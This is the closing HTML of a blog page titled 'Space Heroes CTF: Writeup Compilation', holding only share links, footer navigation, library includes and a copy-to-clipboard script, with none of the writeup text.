  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://enscribe.dev/blog/shctf-2022/writeup-compilation/&title=Space Heroes CTF: Writeup Compilation"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://enscribe.dev/blog/shctf-2022/writeup-compilation/&is_video=false&description=Space Heroes CTF: Writeup Compilation"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Space Heroes CTF: Writeup Compilation&body=Check out this article: https://enscribe.dev/blog/shctf-2022/writeup-compilation/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://enscribe.dev/blog/shctf-2022/writeup-compilation/&title=Space Heroes CTF: Writeup Compilation"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://enscribe.dev/blog/shctf-2022/writeup-compilation/&name=Space Heroes CTF: Writeup Compilation&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> menu</a>
        
            <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
          
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2023
    enscribe
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">home</a></li><!--
     --><!--
       --><li><a href="/articles/">posts</a></li><!--
     --><!--
       --><li><a href="/ctfs/">ctfs</a></li><!--
     --><!--
       --><li><a href="/profiles/">profiles</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
